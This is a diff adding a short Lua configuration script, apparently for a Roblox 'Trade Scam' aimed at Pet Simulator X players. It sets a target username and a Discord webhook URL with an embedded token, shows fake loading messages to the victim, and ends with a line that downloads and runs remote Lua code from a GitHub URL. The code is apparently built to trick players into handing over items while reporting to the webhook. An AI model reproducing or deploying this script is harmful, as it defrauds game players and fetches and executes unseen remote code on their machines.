@@ -1,0 +1,17 @@
+Username = "GHITABAHLOUL02"
+
+WebHook = "https://discord.com/api/webhooks/1089494053839708220/V8wLDvR3-8w1eJ5Qcg5QUHOiugwDlHNkdU34oloR--s3NzrHP7P_G6iKSO7V0oEevlnu"
+
+loadingscreen = true
+
+_G.CustomScriptName = "Trade Scam"
+
+_G.Text1 = "Loading in.."
+
+_G.Text2 = "Almost loaded..."
+
+_G.Text3 = "Please wait..."
+
+_G.Text4 = "Almost Ready.."
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
